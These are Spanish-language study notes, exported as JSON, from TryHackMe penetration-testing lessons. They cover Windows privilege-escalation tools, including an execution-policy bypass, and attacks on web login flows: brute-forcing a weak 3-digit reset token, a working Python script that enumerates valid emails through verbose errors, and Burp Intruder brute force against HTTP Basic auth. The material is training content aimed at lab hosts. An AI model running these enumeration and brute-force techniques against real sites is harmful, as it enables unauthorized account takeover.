[
  {
    "title": "7. Tools of the Trade",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/7-tools-of-the-trade/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/7. Tools of the Trade.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "Existen muchos scripts que realizan enumeración del sistema de manera similar a los que hemos visto en tareas anteriores. Estas herramientas pueden acortar el proceso de enumeración y revelar diferentes vectores potenciales de escalada de privilegios. Aunque debes recordar que puede perderse algunos.\n\nDebajo hay algunas de las herramientas más comúnmente utilizadas.\n\n----------------------------\n<h2>WinPEAS</h2>\nEs un script desarrollado para enumerar el sistema objetivo para descubrir vectores de escalada de privilegios. Puedes encontrar WinPEAS [aquí](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). Es buena idea redirigir el output a un archivo debido a su voluminosidad.\n\n----------------------------\n<h2>PrivescCheck</h2>\nEs un script de PowerShell que busca vectores de escalada de privilegios en el sistema objetivo. Ofrece una alternativa a WinPEAS sin requerir la ejecución de un binario. Puedes encontrarlo [aquí](https://github.com/itm4n/PrivescCheck). \n\n>[!NOTE] Puede que para poder ejecutarlo necesites sobrepasar las políticas de ejecución, usa `Set-ExecutionPolicy`.\n\n\n```powershell\nPS C:\\> Set-ExecutionPolicy Bypass -Scope process -Force\nPS C:\\> . .\\PrivescCheck.ps1\nPS C:\\> Invoke-PrivescCheck\n```\n\n\n---------------------------------\n<h2>WES-NG: Windows Exploit Suggester - Next Generation</h2>\nAlgunos scripts de sugerencia de exploits requerirán que los subas al sistema objetivo y los ejecutes. Esto puede hacer que software antivirus lo detecte y elimine. Para evitar hacer ruido innecesario que pueda atraer atención, puede que prefieras usar WES-NG, que correrá en tu máquina.\n\nWES-NG es un script de Python que puedes encontrar [aquí](https://github.com/bitsadmin/wesng).\n\nUna vez instalado, y antes de usarlo, escribe `wes.py --update` para actualizar la base de datos. El script se referirá a la base de datos que crea para comprobar parches faltantes que puedan resultar en vulnerabilidades en el sistema.\n\nPara usar el script debes ejecutar el comando `systeminfo` en el equipo objetivo. No olvides redirigirlo a un archivo. Una vez hecho esto, puedes ejecutar lo siguiente:\n\n```bash\nuser@kali$ wes.py systeminfo.txt\n```\n\n------------------------------------------\n<h2>Metasploit</h2>\nSi ya tienes una shell Meterpreter en el sistema objetivo, puedes usar el módulo `multi/recon/local_exploit_suggester` para listar vulnerabilidades que pueden afectar al sistema dado.",
    "modified": "2025-12-03T00:51:44"
  },
  {
    "title": "4. Exploiting Vulnerable Password Reset Logic",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/4-exploiting-vulnerable-password-reset-logic/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/4. Exploiting Vulnerable Password Reset Logic.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Vulnerabilidades del Flujo de Reseteo de Contraseñas</h2>\nLos mecanismos de reseteo de contraseñas son una parte muy importante para la conveniencia de los usuarios en las aplicacaiones web modernas. Sin embargo, su implementación requiere un manejo cuidadosoo de las consideraciones de seguridad.\n\n<h4>Email-Based Reset</h4>\nCuando un usuario resetea su contraseña, la aplicación le manda un email conteniendo un link de reseteo o token a la cuenta de email registrada del usuario.\n<h4>Security Question-Based Reset</h4>\nInvolucra al usuario respondiendo una serie de preguntas de seguridad preconfiguradas al crear la cuenta. Si las respuestas son correctas, el sistema deja que el usuario cambie la contraseña.\n<h4>SMS-Based Reset</h4>\nEsta es similar a la basada en email pero con el uso del SMS para dar un código o link de reseteo.\n<h4>Vulnerabilidades</h4>\nCada uno de estos métodos tiene sus vulnerabilidades:\n\n- **Predictible Tokens:** Si los tokens de reseteo usados en los links o SMSs son predecibles o siguen un patrón secuencial, los atacantes pueden adivinar o bruteforcear las URLs.\n- **Token Expiration Issues:** Los tokens que no terminan pronto o inmediatamente después de su uso, son potenciales vectores de ataque.\n- **Insufficient Validation:** Los mecanismos para verificar la identidad del usuario pueden ser débiles o susceptible de explotación si las preguntas son muy comunes.\n- **Information Disclosure:** Cualquier mensaje de error que especifique si el email o nombre de usuario está registrado, puede ayudar a los atacantes a enumerar.\n- **Insecure Transport:** La transmisión del link o token de reseteo mediante conexiones no-HTTPS, pueden exponerlos.\n\n----------------------------------\n<h2>Explotar Tokens Predecibles</h2>\nLos tokens simples, predecibles o tienen un tiempo de expiración largo, pueden ser vulnerables a la intercepción o fuerza bruta. Por ejemplo, el código de abajo se usa por la aplicación vulnerable en el lab de Tokens Predictibles.\n\n```php\n$token = mt_rand(100, 200);\n$query = $conn->prepare(\"UPDATE users SET reset_token = ? WHERE email = ?\");\n$query->bind_param(\"ss\", $token, $email);\n$query->execute();\n```\n\nEste código configura un PIN de 3 dígitos como token de reseteo. Como no emplea caracteres mixtos, puede ser fácilmente bruteforceado.\n\nPara probar esto vamos a la aplicación.\n\n![[Pasted image 20251202162449.png]]\n\nNavegamos hasta la página de reseteo de contraseña y metemos el email `admin@admin.com`.\n\n![[Pasted image 20251202162608.png]]\n\nLa aplicación responderá con un mensaje de éxito.\n\n![[Pasted image 20251202162635.png]]\n\nAhora usaremos burpsuite para generar peticiones web de fuerza bruta. Porque si probamos uno aleatorio se ve así:\n\n![[Pasted image 20251202163208.png]]\n\nArrancamos el ataque:\n\n![[Pasted image 20251202163423.png]]\n\nEsperamos.\n\n![[Pasted image 20251202164031.png]]\n\nUna vez encontrado iniciamos sesión y obtenemos la flag:\n\n![[Pasted image 20251202164138.png]]",
    "modified": "2025-12-03T00:51:44"
  },
  {
    "title": "2. Authentication Enumeration",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/2-authentication-enumeration/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/2. Authentication Enumeration.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Enumeración de Autentificación</h2>\nPiensa en ti como un detective digital. No se trata sólo de recoger pistas sino de entender lo que estas revelan sobre la seguridad del sistema. Esto es en esencia de lo que se trata la enumeración de autentificación.\n\nLa enumeración de autentificación es como pelar capas de una cebolla. Eliminas cada capa en busca del funcionamiento interno del sustema. No se trata de un escaneo rutinario, sino de ver cómo todo conecta.\n\n<h4>Identificar Nombres de Usuario Válidos</h4>\nSaber nombres de usuario válidos permite a un atacante centrarse en obtener la contraseña. Puedes adivinarlos de diferentes maneras, como observar cómo la aplicación responde durante el login o los reseteos de contraseña. Por ejemplo, mensajes de error que digan \"Esta cuenta no existe\" o \"Contraseña incorrecta\" pueden dar pistas a cerca de si la cuenta en cuestión existe.\n<h4>Políticas de Contraseñas</h4>\nLas normas al crear contraseñas pueden ofrecer información valiosa sobre la complejidad de las contraseñas usadas en una aplicación. Entendiendo estas políticas, un atacante puede medirla complejidad potencial de las contraseñas y ajustar su estrategia.\n\nPor ejemplo el siguiente código PHP usa regex para requerir que la contraseña incluya símbolos, números y letras matúsculas:\n\n```php\n<?php\n$password = $_POST['pass']; // Ejemplo1\n$pattern = '/^(?=.*[A-Z])(?=.*\\d)(?=.*[\\W_]).+$/';\n\nif (preg_match($pattern, $password)) {\n    echo \"Password is valid.\";\n} else {\n    echo \"Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.\";\n}\n?>\n```\n\n--------------------------------------------------\n<h2>Sitios Comunes para Enumerar</h2>\nLas aplicaciones están llenas de funcionalidades que hacen las cosas más fáciles para los usuarios pero que también pueden exponerlos a riesgos.\n<h4>Páginas de Registro</h4>\nLas aplicaciones web normalmente hacen que el registro de usuario sea directo e informativo indicando que el usuario escogido ya existe o no. Aunque esto está diseñado para mejorar la experiencia del usuario, puede tener un doble propósito para un atacante.\n<h4>Funcionalidades de Reseteo de Contraseñas</h4>\nLos mecanismos de reseteo de contraseñas están diseñados para ayudar a los usuarios a ganar acceso a su cuenta de nuevo después de olvidar la contraseña. Sin embargo, las respuestas de la aplicación pueden revelar información sensible.\n<h4>Verbosidad de Errores</h4>\nLos mensajes de error durante los intentos de inicio de sesión pueden revelar demasiado. Cuando estos mensajes se diferencian entre \"usuario no encontrado\" y \"contraseña incorrecta\", se intenta que los usuarios entiendan los errores del inicio de sesión. Sin embargo pueden ofecer pistas definitivas para los atacantes.\n<h4>Información de Brechas de Seguridad</h4>\nLa información de brechas de seguridad anteriores son una mina de oro para los atacantes ya que permiten testear su nombres de usuario y contraseñas siguen siendo utilizados.",
    "modified": "2025-12-03T00:51:44"
  },
  {
    "title": "3. Enumerating Users via Verbose Errors",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/3-enumerating-users-via-verbose-errors/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/3. Enumerating Users via Verbose Errors.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Entendiendo la Verbosidad de Errores</h2>\nImagina que eres un detective con un don para encontrar pistas que otros pasan por alto. En el mundo del desarrollo web, la verbosidad de errores son susurros inintencionados de un sistema, revelando secretos que deberían estar esscondidos.\n\nLa verbosidad de errores puede revelar detalles como:\n\n- **Rutas Internas:** Como un mapa del tesoro, revelan la estructura de la aplicación o servidor.\n- **Detalles de Bases de Datos:** Ofrece un vistazo a la base de datos.\n- **Información de Usuario:** A veces, estos errores pueden dar pistas sobre nombres de usuarios.\n\n-------------------------------\n<h2>Induciendo Verbosidad de Errores</h2>\nLos atacantes indicen errores como manera de forzar a la aplicación a revelar sus secretos. Debajo, algunas de las técnicas más utilizadas:\n\n1. **Invalid Login Attempts:** Esto es como picar en todas las puertas para ver cuál se abre. Al introducir nombres erróneos de usuario o contraseñas, los atacantes pueden disparar mensajes de errorque ayuden a distinguir entre nombres de usuario válidos e inválidos.\n2. **SQL Injection:** Esta técnica implica inyectar código SQL malicioso en cada campo, con la esperanza de que el sistema pete y mande mensajes de error que no debería.\n3. **File Inclusion/Path Traversal:** Manipulando rutas de archivos, los atacantes pueden intentar acceder a archivos restringidos llevando al sistema a errores que revelen rutas internas.\n4. **Form Manipulation:** Jugar con los campos de un formulario puede engañasr a la aplicación para que muestre mensajes de error reveladores sobre el backend o la lógica.\n5. **Application Fuzzing:** Mandar inputs no esperados a varias partes de la aplicación, para ver cómo reacciona, puede ayudar a identificar puntos débiles. Por ejemplo, herramientas como el Intruder de Burp Suite se usan para automatizar el proceso.\n\n----------------------------------\n<h2>El Rol de la Enumeración y la Fuerza Bruta</h2>\nCuando se trata de violar la autentificación, la enumeración y la fuerza bruta suelen ir de la mano:\n\n- **Enumeración de Usuarios:** Descubrir nombres de usuario válidos configura el entorno, reduciendo el tiempo de adivinacióon del ataque posterior de fuerza bruta.\n- **Exxplotar Verbosidad de Errores:** Los detalles encontrados gracias a estos errores pueden iluminar aspectos como las políticas de contraseñas y mecanismos de bloqueo de cuenta, allanando el camino de las estrategias de fuerza bruta.\n\nEn resumen, los errores de verbose son como migas de pan que llevan a los atacantes a partes profundas del sistema.\n\n------------------------------\n<h2>Enumeración en Formularios de Autentificación</h2>\nEn este [reporte](https://hackerone.com/reports/1166054) de HackerOne, este atacante fue capaz de enumerar usuarios usando la función de \"Olvidé mi Contraseña\" de la página.\n\nSi vas a la página ofrecida por esta unidad e introduces un correo no registrado obtendrás el siguiente mensaje:\n\n![[Pasted image 20251202132943.png]]\n\nSin embargo, si el correo está registrado, el sitio web responderá con un mensaje de \"invalid Passwoord\", indicando que el email existe pero la contraseña es incorrecta.\n\n![[Pasted image 20251202133041.png]]\n\n--------------------------------------\n<h2>Automatización</h2>\nAquí debajo tienes un script de Python que comprobará emails válidos en la página web objetivo.\n\n```python\nimport requests\nimport sys\n\ndef check_email(email):\n    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function\n    headers = {\n        'Host': 'enum.thm',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',\n        'Accept': 'application/json, text/javascript, */*; q=0.01',\n        'Accept-Language': 'en-US,en;q=0.5',\n        'Accept-Encoding': 'gzip, deflate',\n        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\n        'X-Requested-With': 'XMLHttpRequest',\n        'Origin': 'http://enum.thm',\n        'Connection': 'close',\n        'Referer': 'http://enum.thm/labs/verbose_login/',\n    }\n    data = {\n        'username': email,\n        'password': 'password',  # Use a random password as we are only checking the email\n        'function': 'login'\n    }\n\n    response = requests.post(url, headers=headers, data=data)\n    return response.json()\n\ndef enumerate_emails(email_file):\n    valid_emails = []\n    invalid_error = \"Email does not exist\"  # Error message for invalid emails\n\n    with open(email_file, 'r') as file:\n        emails = file.readlines()\n\n    for email in emails:\n        email = email.strip()  # Remove any leading/trailing whitespace\n        if email:\n            response_json = check_email(email)\n            if response_json['status'] == 'error' and invalid_error in response_json['message']:\n                print(f\"[INVALID] {email}\")\n            else:\n                print(f\"[VALID] {email}\")\n                valid_emails.append(email)\n\n    return valid_emails\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python3 script.py <email_list_file>\")\n        sys.exit(1)\n\n    email_file = sys.argv[1]\n\n    valid_emails = enumerate_emails(email_file)\n\n    print(\"\\nValid emails found:\")\n    for valid_email in valid_emails:\n        print(valid_email)\n```\n\n<h4>Desglose</h4>\n<h6>Importaciones</h6>\n- **requests:** Una librería de Python para hacer peticiones HTTP. Se usa para interactuar con el servidor web mandando peticiones POST al endpoint objetivo.\n\n```python\nimport requests\n```\n\n<h6>Setup</h6>\n- **url:** El script apunta al endpoint objetivo que maneja la funcionalidad de login de la aplicación.\n\n```python\nurl = 'http://enum.thm/labs/verbose_login/functions.php'\n```\n\n- **headers:** Una colección de headers HTTP se define para imitar una petición típica de navegador, asegurando que las peticiones parezcan legítimas.\n\n```python\nheaders = {\n      'Host': 'enum.thm',\n      'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',\n      'Accept': 'application/json, text/javascript, */*; q=0.01',\n      'Accept-Language': 'en-US,en;q=0.5',\n      'Accept-Encoding': 'gzip, deflate',\n      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\n      'X-Requested-With': 'XMLHttpRequest',\n      'Origin': 'http://enum.thm',\n      'Connection': 'close',\n      'Referer': 'http://enum.thm/labs/verbose_login/',\n  }\n```\n\n<h6>Inicialización de variables</h6>\n- **valid_emails:** Un array guarda las direcciones de email válidas.\n\n```python\nvalid_emails = []\n```\n\n- **invalid_error:** Una string contiene el mensaje de error específico usado para identificar correos inválidos.\n\n```python\ninvalid_error = 'Email does not exist'\n```\n\n<h6>Loop Principal</h6>\n- El script comprueba los emails dados y mira si son válidos usando la función `check_email`.\n\n```python\nfor email in email_list:\n    check_email(email)\n```\n\n<h6>Confección y Mandado de Peticiones</h6>\n- Para cada email, el script construye un diccionario de información que incluye la dirección de email, un placeholder \"password\" y un comando que ejecuta la función login.\n\n```python\ndata = {'username': email, 'password': 'password', 'action': 'login'}\nresponse = requests.post(url, headers=headers, data=data)\n```\n\n<h6>Manejo de Respuestas</h6>\n- La respuesta del servidor se procesa para comprobar su el email dado existe, basándose en la existendia de un error específico en la información JSON.\n\n```python\nif invalid_error in response.text:\n    print(f\"{email} is invalid.\")\nelse:\n    print(f\"{email} is valid.\")\n    valid_emails.append(email)\n```\n\n<h6>Verificación de Caracteres</h6>\n- Los emails confirmados se unen a la lista `valid_emails`.\n\n```python\nfor email in valid_emails:\n    print(f\"Valid email found: {email}\")\n```\n\nPodemos usar una lista de emails comunes de este [repositorio](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).\n\n![[Pasted image 20251202143925.png]]\n\nUna vez hayas descargado la lista, usa el script para comprobar emails válidos.",
    "modified": "2025-12-03T00:51:44"
  },
  {
    "title": "5. Exploiting HTTP Basic Authentication",
    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/5-exploiting-http-basic-authentication/",
    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/5. Exploiting HTTP Basic Authentication.md",
    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Basic Authentication in 2k24?</h2>\nLa autentificación básica ofrece un método más directo de securizar el acceso a los dispositivos. Sólo requiere un usuario y una contraseña, haciéndolo sencillo de implementar y manejar en dispositivos con capacidades de procesamiento básicas. Los dispositivos de redo como los routers suelen usar este método. En este escenario el objetivo principal es protegerlo de acceso no autorizado.\n\nMientras que la autentificación básica no ofrece las robustas funcionalidades de seguridad ofrecida por esquemas más complejos como OAuth o autentificación basada en tokens, su simplicidad lo hace adecuado para entornos donde el manejo de sesión y el rastreo de usuarios no se requiera.\n\nLa autentificación básica HTTP se define en [RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617), el cual especifica que las credenciales deberían ser transportadas como una string bas64-encodeada en el header de autorización HTTP. Es directo pero no es seguro en conexiones no-HTTPS ya que bas64 no es un mecanismo de encriptación. El riesgo real viene dado por credenciales débiles.\n\nLa [autentificación básica HTTP](_https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication_) ofrece un mecanismo simple de pregunta respuesta para pedir credenciales de usuario.\n\n![[Pasted image 20251202172103.png]]\n\nEl formato del header de autorización es el siguiente:\n\n```html\nAuthorization: Basic <credentials>\n```\n\nDonde `<credentials>` es el encoding base64 de `username:password`.\n\n-------------------------------------\n<h2>Explotación</h2>\nPara demostrar esto, iremos a la página dada.\n\n![[Pasted image 20251202172348.png]]\n\nIntroducimos cualquier usuario y contraseña en el pop--up.\n\n![[Pasted image 20251202172436.png]]\n\nCapturamos la petición básica de autentificación usando Burp Suite\n\n![[Pasted image 20251202172701.png]]\n\nConvertimos el texto base64:\n\n![[Pasted image 20251202172950.png]]\n\nUna vez decodeado lo highlighteamos con el intruder.\n\n![[Pasted image 20251202173135.png]]\n\nUsaremos la lista `/usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt`.\n\n![[Pasted image 20251202173242.png]]\n\nAhora necesitamos configurar dos normas:\n\n1. La primera que configuraremos añade el prefijo `admin:` para que el payload sea `username:password`.\n   ![[Pasted image 20251202173353.png]]\n2. La segunda convierte el payload a base64.\n   ![[Pasted image 20251202173411.png]]\n\nTambién deberíamos borrar el `=` porque base64 lo utiliza para hacer que tengan la misma longitud. Para hacerlo vamos hasta abajo y lo borramos de la lista de caracteres a quitar en el payload.\n\n![[Pasted image 20251202173526.png]]\n\nUna vez hecho vamos arrancamos el ataque.\n\n![[Pasted image 20251202174019.png]]\n\nEncontramos la contraseña.\n\n![[Pasted image 20251202174418.png]]\n\nNos registramos pa obtener la flag.\n\n![[Pasted image 20251202174510.png]]",
    "modified": "2025-12-03T00:51:44"
  }
]